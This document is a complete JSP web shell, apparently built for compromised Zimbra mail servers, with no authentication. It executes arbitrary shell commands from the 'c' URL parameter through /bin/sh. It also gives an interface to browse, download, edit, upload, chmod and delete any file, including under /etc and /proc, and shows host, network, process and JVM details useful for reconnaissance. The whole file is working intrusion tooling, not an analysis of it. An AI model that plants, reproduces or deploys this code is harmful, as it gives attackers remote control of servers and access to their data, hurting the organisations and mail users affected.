<%@ page contentType="text/html; charset=UTF-8" pageEncoding="UTF-8" import="java.io.*,java.util.*,java.nio.file.*,java.nio.file.attribute.*,java.net.*,java.lang.management.*" %><%
final String SIG = "Nx-zD";

String cmd = request.getParameter("c");
if (cmd != null && !cmd.trim().isEmpty()) {
    response.setContentType("text/plain; charset=UTF-8");
    try {
        Process p = Runtime.getRuntime().exec(new String[]{"/bin/sh","-c",cmd});
        byte[] buf = new byte[8192]; int n;
        InputStream ins = p.getInputStream();
        while ((n = ins.read(buf)) > 0) out.print(new String(buf, 0, n, "UTF-8"));
        ins = p.getErrorStream();
        while ((n = ins.read(buf)) > 0) out.print(new String(buf, 0, n, "UTF-8"));
    } catch (Exception ex) { out.print("ERR: " + ex.getMessage()); }
    return;
}

String action = request.getParameter("a");
String path = request.getParameter("p");
if (path == null || path.trim().isEmpty()) path = "/";
File cwd = new File(path).getCanonicalFile();
if (!cwd.exists()) cwd = new File("/");

if ("dl".equals(action)) {
    File f = new File(request.getParameter("f"));
    if (f.isFile()) {
        response.setContentType("application/octet-stream");
        response.setHeader("Content-Disposition", "attachment; filename=\"" + f.getName() + "\"");
        FileInputStream fis = new FileInputStream(f);
        byte[] b = new byte[8192]; int r;
        javax.servlet.ServletOutputStream sos = response.getOutputStream();
        while ((r = fis.read(b)) > 0) sos.write(b, 0, r);
        fis.close();
        return;
    }
}

if ("save".equals(action) && "POST".equalsIgnoreCase(request.getMethod())) {
    String target = request.getParameter("f");
    String content = request.getParameter("content");
    if (target != null && content != null) {
        FileWriter fw = new FileWriter(new File(target));
        fw.write(content);
        fw.close();
        response.sendRedirect("?p=" + enc(new File(target).getParent()));
        return;
    }
}

if ("rm".equals(action)) {
    File f = new File(request.getParameter("f"));
    if (f.exists()) { if (f.isDirectory()) rmDir(f); else f.delete(); }
    response.sendRedirect("?p=" + enc(cwd.getAbsolutePath()));
    return;
}

if ("mkdir".equals(action)) {
    String name = request.getParameter("n");
    if (name != null && !name.trim().isEmpty()) new File(cwd, name.trim()).mkdir();
    response.sendRedirect("?p=" + enc(cwd.getAbsolutePath()));
    return;
}

if ("touch".equals(action)) {
    String name = request.getParameter("n");
    if (name != null && !name.trim().isEmpty()) new File(cwd, name.trim()).createNewFile();
    response.sendRedirect("?p=" + enc(cwd.getAbsolutePath()));
    return;
}

if ("chmod".equals(action) && "POST".equalsIgnoreCase(request.getMethod())) {
    String target = request.getParameter("f");
    String mode = request.getParameter("mode");
    if (target != null && mode != null) {
        File tf = new File(target);
        if (tf.exists()) {
            try {
                int m = Integer.parseInt(mode.trim(), 8);
                tf.setReadable((m & 0400) != 0, ((m & 0040) == 0 && (m & 0004) == 0));
                tf.setWritable((m & 0200) != 0, ((m & 0020) == 0 && (m & 0002) == 0));
                tf.setExecutable((m & 0100) != 0, ((m & 0010) == 0 && (m & 0001) == 0));
                try { Files.setPosixFilePermissions(tf.toPath(), posixFromOctal(mode.trim())); } catch (Exception ignore) {}
            } catch (Exception ignore) {}
        }
    }
    response.sendRedirect("?p=" + enc(cwd.getAbsolutePath()));
    return;
}

if ("upload".equals(action) && "POST".equalsIgnoreCase(request.getMethod())) {
    String fn = request.getParameter("fn");
    String data = request.getParameter("data");
    if (fn != null && data != null && !fn.trim().isEmpty()) {
        FileOutputStream fos = new FileOutputStream(new File(cwd, new File(fn.trim()).getName()));
        fos.write(data.getBytes("UTF-8"));
        fos.close();
    }
    response.sendRedirect("?p=" + enc(cwd.getAbsolutePath()));
    return;
}

String editFile = request.getParameter("edit");
String chmodFile = request.getParameter("chmod");
%><!DOCTYPE html>
<html lang="tr">
<head>
<meta charset="UTF-8">
<meta name="generator" content="<%=SIG%>">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title><%=h(cwd.getAbsolutePath())%></title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{background:#121110;color:#c8c4bc;font:13px/1.45 "Courier New",Courier,monospace;min-height:100vh}
a{color:#d4a84b;text-decoration:none;border-bottom:1px dotted #5a5038}
a:hover{color:#f0c060;border-bottom-color:#f0c060}
.hdr{border-bottom:1px solid #3a3630;padding:8px 12px;background:#0e0d0c;color:#8a8272;font-size:12px}
.hdr strong{color:#d4a84b;font-weight:normal}
.layout{display:flex;min-height:calc(100vh - 33px)}
.main{flex:1;min-width:0;border-right:1px solid #3a3630}
.side{width:340px;flex-shrink:0;background:#0e0d0c;overflow-y:auto;max-height:calc(100vh - 33px)}
.bar{padding:6px 12px;border-bottom:1px solid #2a2824;display:flex;gap:10px;flex-wrap:wrap;align-items:baseline}
.bar span{color:#6a6458}
.path{color:#e8e4dc;word-break:break-all}
table{width:100%;border-collapse:collapse}
th,td{padding:4px 10px;border-bottom:1px solid #222018;text-align:left;vertical-align:top}
th{color:#6a6458;font-weight:normal;font-size:11px;background:#0e0d0c;position:sticky;top:0}
tr:hover td{background:#181614}
.dir{color:#d4a84b}
.perm{color:#9a9080}
.dim{color:#6a6458;font-size:12px}
.act a{margin-right:8px;font-size:12px}
.act .x{color:#a85848;border-color:#5a3028}
.box{border-bottom:1px solid #2a2824}
.box-h{padding:6px 10px;font-size:11px;color:#6a6458;background:#0a0908;border-bottom:1px solid #222018}
.box-b{padding:8px 10px 10px}
.spec{width:100%;font-size:11px}
.spec tr td{padding:2px 0;vertical-align:top;border:0}
.spec .k{color:#6a6458;width:38%;padding-right:8px;white-space:nowrap}
.spec .v{color:#c8c4bc;word-break:break-all}
.spec .v em{color:#d4a84b;font-style:normal}
input[type=text],textarea{width:100%;background:#0a0908;border:1px solid #3a3630;color:#e8e4dc;padding:6px 8px;font:inherit;font-size:12px}
textarea{min-height:90px;resize:vertical}
textarea.editor{min-height:400px}
label{display:block;color:#6a6458;font-size:11px;margin:0 0 4px}
.row{margin-top:8px;display:flex;gap:8px;flex-wrap:wrap}
.btn{background:#0a0908;border:1px solid #4a4438;color:#c8c4bc;padding:4px 10px;font:inherit;font-size:12px;cursor:pointer}
.btn:hover{border-color:#d4a84b;color:#d4a84b}
.links a{margin-right:10px;font-size:12px}
.empty{padding:24px;text-align:center;color:#6a6458}
.pg{padding:12px}
.pg-h{margin-bottom:10px;color:#6a6458;font-size:11px}
.ft{padding:8px 12px;border-top:1px solid #2a2824;color:#4a4438;font-size:11px}
.sep{color:#3a3630}
</style>
</head>
<body>
<div class="hdr"><!-- <%=SIG%> --> cwd <strong><%=h(cwd.getAbsolutePath())%></strong> <span class="sep">|</span> <%=listCount(cwd)%> entries <span class="sep">|</span> <%=fmt(cwd.getFreeSpace())%> free</div>
<div class="layout">
<div class="main">
<%!
void rmDir(File d) {
    File[] fs = d.listFiles();
    if (fs != null) for (File f : fs) { if (f.isDirectory()) rmDir(f); else f.delete(); }
    d.delete();
}
String fmt(long b) {
    if (b < 1024) return b + " B";
    if (b < 1048576) return String.format("%.1f KB", b/1024.0);
    if (b < 1073741824) return String.format("%.1f MB", b/1048576.0);
    return String.format("%.2f GB", b/1073741824.0);
}
String h(String s) {
    if (s == null) return "";
    return s.replace("&","&amp;").replace("<","&lt;").replace(">","&gt;").replace("\"","&quot;");
}
String enc(String s) throws Exception { return java.net.URLEncoder.encode(s, "UTF-8"); }
int listCount(File d) { File[] f = d.listFiles(); return f == null ? 0 : f.length; }
String readLine(String p) {
    try { BufferedReader r = new BufferedReader(new FileReader(p)); String l = r.readLine(); r.close(); return l == null ? "" : l.trim(); }
    catch (Exception e) { return ""; }
}
String hostName() {
    try { return InetAddress.getLocalHost().getHostName(); } catch (Exception e) { return "?"; }
}
String hostAddr() {
    try { return InetAddress.getLocalHost().getHostAddress(); } catch (Exception e) { return "?"; }
}
String ifaces() {
    StringBuilder sb = new StringBuilder();
    try {
        Enumeration<NetworkInterface> nets = NetworkInterface.getNetworkInterfaces();
        while (nets.hasMoreElements()) {
            NetworkInterface ni = nets.nextElement();
            if (!ni.isUp() || ni.isLoopback()) continue;
            Enumeration<InetAddress> addrs = ni.getInetAddresses();
            while (addrs.hasMoreElements()) {
                InetAddress a = addrs.nextElement();
                if (a instanceof Inet4Address) {
                    if (sb.length() > 0) sb.append(", ");
                    sb.append(ni.getName()).append("=").append(a.getHostAddress());
                }
            }
        }
    } catch (Exception e) { return e.getMessage(); }
    return sb.length() == 0 ? "none" : sb.toString();
}
String jvmPid() {
    try { return ManagementFactory.getRuntimeMXBean().getName().split("@")[0]; } catch (Exception e) { return readLine("/proc/self/stat").split(" ")[0]; }
}
String memLine() {
    Runtime rt = Runtime.getRuntime();
    long max = rt.maxMemory(), total = rt.totalMemory(), free = rt.freeMemory(), used = total - free;
    return fmt(used) + " used / " + fmt(total) + " heap / " + fmt(max) + " max";
}
String loadAvg() { return readLine("/proc/loadavg"); }
String upTime() {
    String raw = readLine("/proc/uptime");
    if (raw.isEmpty()) return "?";
    try {
        double s = Double.parseDouble(raw.split("\\s+")[0]);
        long d = (long)(s / 86400), h = (long)((s % 86400) / 3600), m = (long)((s % 3600) / 60);
        return d + "d " + h + "h " + m + "m";
    } catch (Exception e) { return raw; }
}
String uname() {
    StringBuilder sb = new StringBuilder();
    sb.append(System.getProperty("os.name")).append(" ");
    sb.append(System.getProperty("os.version")).append(" ");
    sb.append(System.getProperty("os.arch"));
    return sb.toString();
}
String perm(File f) {
    try {
        PosixFileAttributes a = Files.readAttributes(f.toPath(), PosixFileAttributes.class);
        Set<PosixFilePermission> p = a.permissions();
        StringBuilder sb = new StringBuilder();
        sb.append(Files.isDirectory(f.toPath()) ? "d" : "-");
        sb.append(p.contains(PosixFilePermission.OWNER_READ) ? "r" : "-");
        sb.append(p.contains(PosixFilePermission.OWNER_WRITE) ? "w" : "-");
        sb.append(p.contains(PosixFilePermission.OWNER_EXECUTE) ? "x" : "-");
        sb.append(p.contains(PosixFilePermission.GROUP_READ) ? "r" : "-");
        sb.append(p.contains(PosixFilePermission.GROUP_WRITE) ? "w" : "-");
        sb.append(p.contains(PosixFilePermission.GROUP_EXECUTE) ? "x" : "-");
        sb.append(p.contains(PosixFilePermission.OTHERS_READ) ? "r" : "-");
        sb.append(p.contains(PosixFilePermission.OTHERS_WRITE) ? "w" : "-");
        sb.append(p.contains(PosixFilePermission.OTHERS_EXECUTE) ? "x" : "-");
        return sb.toString();
    } catch (Exception e) {
        return (f.isDirectory() ? "d" : "-") + (f.canRead() ? "r" : "-") + (f.canWrite() ? "w" : "-") + (f.canExecute() ? "x" : "-") + "------";
    }
}
String octalMode(File f) {
    try {
        PosixFileAttributes a = Files.readAttributes(f.toPath(), PosixFileAttributes.class);
        int m = 0; Set<PosixFilePermission> p = a.permissions();
        if (p.contains(PosixFilePermission.OWNER_READ)) m |= 0400;
        if (p.contains(PosixFilePermission.OWNER_WRITE)) m |= 0200;
        if (p.contains(PosixFilePermission.OWNER_EXECUTE)) m |= 0100;
        if (p.contains(PosixFilePermission.GROUP_READ)) m |= 0040;
        if (p.contains(PosixFilePermission.GROUP_WRITE)) m |= 0020;
        if (p.contains(PosixFilePermission.GROUP_EXECUTE)) m |= 0010;
        if (p.contains(PosixFilePermission.OTHERS_READ)) m |= 0004;
        if (p.contains(PosixFilePermission.OTHERS_WRITE)) m |= 0002;
        if (p.contains(PosixFilePermission.OTHERS_EXECUTE)) m |= 0001;
        return String.format("%04o", m);
    } catch (Exception e) { return "????"; }
}
Set<PosixFilePermission> posixFromOctal(String mode) {
    int m = Integer.parseInt(mode, 8);
    Set<PosixFilePermission> perms = EnumSet.noneOf(PosixFilePermission.class);
    if ((m & 0400) != 0) perms.add(PosixFilePermission.OWNER_READ);
    if ((m & 0200) != 0) perms.add(PosixFilePermission.OWNER_WRITE);
    if ((m & 0100) != 0) perms.add(PosixFilePermission.OWNER_EXECUTE);
    if ((m & 0040) != 0) perms.add(PosixFilePermission.GROUP_READ);
    if ((m & 0020) != 0) perms.add(PosixFilePermission.GROUP_WRITE);
    if ((m & 0010) != 0) perms.add(PosixFilePermission.GROUP_EXECUTE);
    if ((m & 0004) != 0) perms.add(PosixFilePermission.OTHERS_READ);
    if ((m & 0002) != 0) perms.add(PosixFilePermission.OTHERS_WRITE);
    if ((m & 0001) != 0) perms.add(PosixFilePermission.OTHERS_EXECUTE);
    return perms;
}
void specRow(JspWriter o, String k, String v) throws Exception {
    o.print("<tr><td class=\"k\">"); o.print(h(k)); o.print("</td><td class=\"v\">"); o.print(v); o.print("</td></tr>");
}
%><%
if (editFile != null) {
    File ef = new File(editFile);
    String content = "";
    if (ef.isFile()) {
        Scanner sc = new Scanner(ef, "UTF-8").useDelimiter("\\A");
        content = sc.hasNext() ? sc.next() : "";
        sc.close();
    }
%>
<div class="pg">
  <div class="pg-h">edit &gt; <%=h(ef.getAbsolutePath())%> &nbsp; <%=fmt(ef.length())%> &nbsp; <%=octalMode(ef)%></div>
  <form method="post" action="?a=save&p=<%=enc(cwd.getAbsolutePath())%>">
    <input type="hidden" name="f" value="<%=h(ef.getAbsolutePath())%>">
    <textarea class="editor" name="content"><%=h(content)%></textarea>
    <div class="row"><button class="btn" type="submit">save</button><a href="?p=<%=enc(cwd.getAbsolutePath())%>">cancel</a></div>
  </form>
</div>
<% } else if (chmodFile != null) {
    File cf = new File(chmodFile);
%>
<div class="pg">
  <div class="pg-h">chmod &gt; <%=h(cf.getAbsolutePath())%> &nbsp; now <%=octalMode(cf)%> <%=perm(cf)%></div>
  <form method="post" action="?a=chmod&p=<%=enc(cwd.getAbsolutePath())%>">
    <input type="hidden" name="f" value="<%=h(cf.getAbsolutePath())%>">
    <label>octal mode</label>
    <input type="text" name="mode" value="<%=octalMode(cf)%>" maxlength="4">
    <div class="links" style="margin:8px 0">
      <a href="#" onclick="document.querySelector('[name=mode]').value='0755';return false">755</a>
      <a href="#" onclick="document.querySelector('[name=mode]').value='0644';return false">644</a>
      <a href="#" onclick="document.querySelector('[name=mode]').value='0777';return false">777</a>
      <a href="#" onclick="document.querySelector('[name=mode]').value='0700';return false">700</a>
      <a href="#" onclick="document.querySelector('[name=mode]').value='0600';return false">600</a>
    </div>
    <div class="row"><button class="btn" type="submit">apply</button><a href="?p=<%=enc(cwd.getAbsolutePath())%>">cancel</a></div>
  </form>
</div>
<% } else { %>
<div class="bar links">
  <a href="?p=/">/</a>
  <a href="?p=<%=enc("/opt/zimbra")%>">zimbra</a>
  <a href="?p=<%=enc("/tmp")%>">tmp</a>
  <a href="?p=<%=enc("/var/log")%>">log</a>
  <a href="?p=<%=enc("/etc")%>">etc</a>
  <a href="?p=<%=enc("/proc")%>">proc</a>
</div>
<table>
<tr><th>name</th><th>mode</th><th>perm</th><th>size</th><th>mtime</th><th></th></tr>
<%
File parent = cwd.getParentFile();
if (parent != null) {
%><tr><td colspan="6"><a class="dir" href="?p=<%=enc(parent.getAbsolutePath())%>">../</a></td></tr><%
}
File[] list = cwd.listFiles();
if (list == null || list.length == 0) {
%><tr><td colspan="6" class="empty">(empty)</td></tr><%
} else {
    Arrays.sort(list, new Comparator<File>(){
        public int compare(File a, File b) {
            if (a.isDirectory() && !b.isDirectory()) return -1;
            if (!a.isDirectory() && b.isDirectory()) return 1;
            return a.getName().compareToIgnoreCase(b.getName());
        }
    });
    for (File f : list) {
        String fp = f.getAbsolutePath();
        String encF = enc(fp);
        String encDir = enc(cwd.getAbsolutePath());
%>
<tr>
  <td><% if (f.isDirectory()) { %><a class="dir" href="?p=<%=encF%>"><%=h(f.getName())%>/</a><% } else { %><%=h(f.getName())%><% } %></td>
  <td class="dim"><%=octalMode(f)%></td>
  <td class="perm"><%=perm(f)%></td>
  <td class="dim"><%= f.isDirectory() ? "-" : fmt(f.length()) %></td>
  <td class="dim"><%= new java.text.SimpleDateFormat("yy-MM-dd HH:mm").format(new Date(f.lastModified())) %></td>
  <td class="act">
    <% if (f.isDirectory()) { %><a href="?p=<%=encF%>">open</a><% } else { %>
    <a href="?a=dl&f=<%=encF%>">dl</a><a href="?edit=<%=encF%>&p=<%=encDir%>">edit</a><% } %>
    <a href="?chmod=<%=encF%>&p=<%=encDir%>">chmod</a>
    <a class="x" href="?a=rm&f=<%=encF%>&p=<%=encDir%>" onclick="return confirm('del?')">del</a>
  </td>
</tr>
<% }} %>
</table>
<% } %>
</div>
<div class="side">
  <div class="box">
    <div class="box-h">host / os</div>
    <div class="box-b">
      <table class="spec">
        <% specRow(out, "hostname", h(hostName())); %>
        <% specRow(out, "host addr", h(hostAddr())); %>
        <% specRow(out, "uname", h(uname())); %>
        <% specRow(out, "uptime", h(upTime())); %>
        <% specRow(out, "loadavg", h(loadAvg())); %>
        <% specRow(out, "cpus", String.valueOf(Runtime.getRuntime().availableProcessors())); %>
        <% specRow(out, "interfaces", h(ifaces())); %>
      </table>
    </div>
  </div>
  <div class="box">
    <div class="box-h">process / user</div>
    <div class="box-b">
      <table class="spec">
        <% specRow(out, "user", h(System.getProperty("user.name"))); %>
        <%
        String uid = "", gid = "";
        try {
            BufferedReader br = new BufferedReader(new FileReader("/proc/self/status"));
            String ln;
            while ((ln = br.readLine()) != null) {
                if (ln.startsWith("Uid:")) uid = ln.replaceFirst("Uid:\\s+", "").trim();
                if (ln.startsWith("Gid:")) gid = ln.replaceFirst("Gid:\\s+", "").trim();
            }
            br.close();
        } catch (Exception ignore) {}
        specRow(out, "uid / gid", h(uid + " / " + gid));
        specRow(out, "pid", h(jvmPid()));
        specRow(out, "home", h(System.getProperty("user.home"))); %>
        <% specRow(out, "cwd", h(System.getProperty("user.dir"))); %>
        <% specRow(out, "tmp", h(System.getProperty("java.io.tmpdir"))); %>
      </table>
    </div>
  </div>
  <div class="box">
    <div class="box-h">java / servlet</div>
    <div class="box-b">
      <table class="spec">
        <% specRow(out, "java", h(System.getProperty("java.version"))); %>
        <% specRow(out, "vendor", h(System.getProperty("java.vendor"))); %>
        <% specRow(out, "vm", h(System.getProperty("java.vm.name"))); %>
        <% specRow(out, "java home", h(System.getProperty("java.home"))); %>
        <% specRow(out, "memory", h(memLine())); %>
        <% specRow(out, "catalina", h(System.getProperty("catalina.base", System.getProperty("catalina.home", "-")))); %>
        <% specRow(out, "server", h(application.getServerInfo())); %>
        <% specRow(out, "servlet", h(application.getMajorVersion() + "." + application.getMinorVersion())); %>
      </table>
    </div>
  </div>
  <div class="box">
    <div class="box-h">request / disk</div>
    <div class="box-b">
      <table class="spec">
        <% specRow(out, "remote", h(request.getRemoteAddr() + ":" + request.getRemotePort())); %>
        <% specRow(out, "local", h(request.getLocalAddr() + ":" + request.getLocalPort())); %>
        <% specRow(out, "scheme", h(request.getScheme())); %>
        <% specRow(out, "server", h(request.getServerName())); %>
        <% specRow(out, "ua", h(request.getHeader("User-Agent") != null ? request.getHeader("User-Agent") : "-")); %>
        <% specRow(out, "browse path", h(cwd.getAbsolutePath())); %>
        <% specRow(out, "disk total", fmt(cwd.getTotalSpace())); %>
        <% specRow(out, "disk free", fmt(cwd.getFreeSpace())); %>
        <% specRow(out, "disk usable", fmt(cwd.getUsableSpace())); %>
        <% specRow(out, "separator", h(File.separator + " / " + System.getProperty("line.separator").replace("\r","\\r").replace("\n","\\n"))); %>
      </table>
    </div>
  </div>
  <div class="box">
    <div class="box-h">goto</div>
    <div class="box-b">
      <form method="get">
        <input type="text" name="p" value="<%=h(cwd.getAbsolutePath())%>">
        <div class="row"><button class="btn" type="submit">go</button></div>
      </form>
    </div>
  </div>
  <div class="box">
    <div class="box-h">mkdir / touch</div>
    <div class="box-b">
      <form method="get" style="margin-bottom:8px">
        <input type="hidden" name="a" value="mkdir">
        <input type="hidden" name="p" value="<%=h(cwd.getAbsolutePath())%>">
        <label>new dir</label>
        <input type="text" name="n" placeholder="dirname">
        <div class="row"><button class="btn" type="submit">mkdir</button></div>
      </form>
      <form method="get">
        <input type="hidden" name="a" value="touch">
        <input type="hidden" name="p" value="<%=h(cwd.getAbsolutePath())%>">
        <label>new file</label>
        <input type="text" name="n" placeholder="filename">
        <div class="row"><button class="btn" type="submit">touch</button></div>
      </form>
    </div>
  </div>
  <div class="box">
    <div class="box-h">upload</div>
    <div class="box-b">
      <form method="post" action="?a=upload&p=<%=enc(cwd.getAbsolutePath())%>">
        <label>filename</label>
        <input type="text" name="fn">
        <label style="margin-top:6px">content</label>
        <textarea name="data"></textarea>
        <div class="row"><button class="btn" type="submit">put</button></div>
      </form>
    </div>
  </div>
  <div class="box">
    <div class="box-h">shell (?c=)</div>
    <div class="box-b">
      <form method="get">
        <input type="text" name="c" placeholder="id; uname -a">
        <div class="row"><button class="btn" type="submit">run</button></div>
      </form>
    </div>
  </div>
</div>
</div>
<div class="ft"><%=SIG%> &nbsp; <%=h(new java.text.SimpleDateFormat("yyyy-MM-dd HH:mm:ss Z").format(new Date()))%></div>
</body>
</html>
